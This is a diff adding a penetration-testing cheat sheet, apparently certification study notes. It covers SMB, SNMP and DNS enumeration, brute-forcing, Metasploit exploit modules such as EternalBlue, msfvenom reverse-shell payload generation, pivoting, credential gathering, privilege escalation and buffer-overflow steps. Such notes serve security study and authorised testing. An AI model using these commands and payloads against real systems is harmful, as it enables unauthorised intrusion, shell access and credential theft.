@@ -1,1 +1,174 @@
 # PTP
+# Enummeration NetBiose / Smb
+  - Enumerate host name : nmblookup
+  - List Share : smbmap ,  smbclient,  nmap
+  - Check Null Sessions: smbmap / smbclient
+  - Overal Scan : enum4linux
+- NetBIOS - file share
+  - Enumerate Hostname :nmblookup -A [ip]
+  - e.g / nmblookup -A 10.130.40.70
+  - collects NetBIOS over TCP/IP client used to lookup NetBIOS names. to display the NetBIOS name table
+- Smbclinet
+  - smbclient -L IP 
+  - smbclient -L \\\\IP
+  - smbclient -L \\\\IP -U 'Username'
+  - e.g / smbclient -L \\\\172.16.27.132 -U 'administrator'
+  - smbclient \\\\IP\\fileshare -U username
+  - e.g / smbclient \\\\172.16.27.132\\C$ -U administrator
+  - smbclient \\\\IP\\fileshare  -N NoPassword
+  - Uploud file from smb : get NameOfFileName : e.g : get credentinal.txt
+- smbmap
+  - smbmap -H [ip/hostname]
+  - smbmap -H [ip] -d [domain] -u [user] -p [password]
+  -  show Permissions in fles
+- nmap
+  - nmap --script smb-enum-shares -p 139,445 [ip]
+  - nmap --script smb-vuln* -p 139,445 [ip]
+  - nmap --script=smb-enum-users -p 445 IP
+- Enumerate share using Meat
+  - use auxiliary/scanner/smb/smb_enumshares
+- nbtstate
+  - C:/ nbtstate -A [targetip]
+- nbtscan
+  - in kali : nbtscan -v [target ip]
+- net view COMMAND
+  - Displays a list of domains, computers, or resources that are being shared by the specified computer
+  - C:\>net view [IP]
+- net use COMMAND
+  - net use A: \\IP \fileShare
+- smbclient Bruteforce :
+  - use auxiliary/scanner/smb/smb_login
+    - set userfile,pass,rhosts
+  - Using ncrack
+    - ncrack -U[file] -P[file] IP:445
+  - Using Hydra
+    - hydra smb://IP -L file -P file
+  - NMAP secript :
+     - nmap --script smb-brute.nse -p U:137,T:139 IP
+     - nmap -p445 --script smb-brute IP
+ - Enumerate smb Version
+   - use auxiliary/scanner/smb/smb_version
+# Explotations smb
+  - using Metasploit psexec if Knowing creadentials
+      - use exploit/windows/smb/psexec
+  - Exp geneeral
+    - exploit/windows/smb/ms08_067_netapi 
+    - exploit/windows/smb/ms17_010_psexec 
+    - exploit/windows/dcerpc/ms03_026_dcom
+    - SMB Relay exploit
+       - exploit/windows/smb/smb_relay
+    - EternalBlue SMB
+       - exploit/windows/smb/ms17_010_eternalblue
+ - Enum4linux
+    - enum4linux -a IP
+    - Do all simple enumeration (-U -S -G -P -r -o -n -i).
+    - (-U get userlist )/ -S get sharelist
+    - -P get password policy/
+    - -u user specify username to use (default "")
+    - -p pass specify password to use (default "")
+    - e.g enum4linux -a -u anyuser IP
+    - e.g enum4linux -a -w WORKGROUP IP
+ - nbtstat(Win) = nbtscan(linux) 
+ - net view (win)=smbclint (linux)
+# Enumeration SNMP
+ - know the host which is running SNMP
+ - Obtain the community name
+ - nmap -p 161 IP --script snmp-brute
+ - snmpwalk Tools
+   - snmpwalk -v 1 -c NameOfComm IP
+   - SNMP Obtain Community string
+     - like a user id or password that allows access to a device's
+     - onesixtyone -c /usr/share/doc/onesixtyone/dict.txt IP
+   - Using packetstorm Tools
+     - snmpenum, uses a database of OIDs to request specific information via SNMP
+     - perl snmpenum.pl [IP which runnig snmp] public windows.txt
+     - the result : SYSTEM INFO , Disk , Shre, Users ,tcp port ,running process
+# DNS
+   - Using packetstorm Tools
+      - snmpenum, uses a database of OIDs to request specific information via SNMP
+   - Discover Domain Name
+      - dig @IP -x IP +nocookie
+   - Discover hosts in network
+      - cat /usr/share/fierce/hosts.txt
+   - using Reverse DNS Lookups
+       - create a list of ip using crunch
+       - e.g: # crunch 11 11 -t 172.16.5.%% -o iplist.txt
+       - create shell secript
+   - using Forward DNS Lookups
+       - contain a list of file name
+       - for name in $(cat /usr/share/fierce/hosts.txt); do host $name.[Domain name] [IP] -W 2;
+ # msfvenume payloud
+  - Linux Meterpreter Reverse Shell
+      - msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf > shell.elf
+  - Linux Bind Meterpreter Shell
+      - msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > bind.elf
+  - Windows Meterpreter Reverse TCP Shell
+      - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
+  - PHP Meterpreter Reverse TCP
+      - msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php
+  - WAR
+      - msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war
+  - convert Shell to meterpreter session
+      - use post/multi/manage/shell_to_meterpreter
+  - meterpreter = Architecture for os
+      - ps -A x86_64 -s 
+      - migrate [pid]
+  # Piovating
+   - meterpreter> run autoroute -s IP/24
+   - Ping-sweep the network
+      - meterpreter > run arp_scanner -r IP/24
+   - Scan each host
+      - use auxiliary/scanner/portscan/tcp
+   - port forwarding
+      - portfwd add -l <attacker port> -p <victim port> -r <victim ip>
+      - portfwd add -l 3306 -p 3306 -r 192.168.222
+   - we can access this port on our machine locally like this.
+      - nc IP Port
+      - nc 127.0.0.1 3306
+   - proxychains nc IP PORT
+   - proxychains :
+      - use auxiliary/server/socks4a
+      - use auxiliary/server/socks_proxy
+   - proxychains nmap -sTV -Pn IP
+   - proxychains nmap -sTV -p 21 -Pn IP
+   - List of installed application
+   - run post/windows/gather/enum_applications
+   - to get credentials from FTP software like FileZilla,
+      - run post/multi/gather/filezilla_client_cred
+# Privilege Escalation techniques - Windows
+  - get system
+  - User Account Control is enabled : UAC true ?
+     - meterpreter > run post/windows/gather/win_privs
+     - use exploit/windows/local/bypassuac
+  - meterpreter > use incognito
+     - meterpreter > list_tokens -u
+     - meterpreter > impersonate_token [Write Token]
+  - Local Exploit Suggester:
+     - use post/multi/recon/local_exploit_suggester
+         - set session [write session num]
+  - 
+# Linux Privilege Escalation
+  - Kernel exploits
+     - uname -a 
+     - search in exploit db or using metasp… like :
+     - glibc_ld_audit_dso_load_priv_esc
+ - services which are running as root
+     - ps -aux | grep root 
+      - netstat -antup
+ - SUID 
+      - find / -perm -u=s -type f 2>/dev/null 
+ - SUDO sudo -l 
+ - Exploiting badly configured cron jobs
+      - prints cron jobs which are already present in cron.d ls -la /etc/cron.d 
+      - find / -perm -2 -type f 2>/dev/null
+ # BufferOver flow
+   - Create unique string: 
+       - !mona pc [1000]
+   - Find the write offset
+       - !mona po [write the address in EIP]
+   - overwrite EIP with [jump ESP]
+   - !mona jmp -r esp 
+   - !mona jmp -r esp -m kernel
+   - breakpoint in this address 
+   - Finding Bad Characters 
+   - Generate Shellcode and Gaining Shells
